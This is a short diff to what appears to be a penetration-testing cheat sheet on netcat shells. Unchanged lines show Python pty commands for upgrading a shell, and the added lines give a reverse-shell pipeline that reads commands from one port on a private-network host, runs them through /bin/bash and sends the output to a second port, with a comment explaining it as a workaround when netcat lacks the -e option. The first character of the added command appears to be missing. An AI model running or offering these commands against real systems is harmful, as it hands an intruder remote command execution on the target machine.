@@ -9,6 +9,10 @@ netcat
     python -c "import pty; pty.spawn ('/bin/bash')"  
      python3 -c "import pty; pty.spawn ('/bin/bash')"  # to change for a better shell
 
+	c 192.168.1.110 2233 | /bin/bash | nc 192.168.1.110 8000
+		# if nc on target host does not support -e /bin/bash, transfer the result to an additional port on the source host.
+
+
 
 **********************************************************************
 
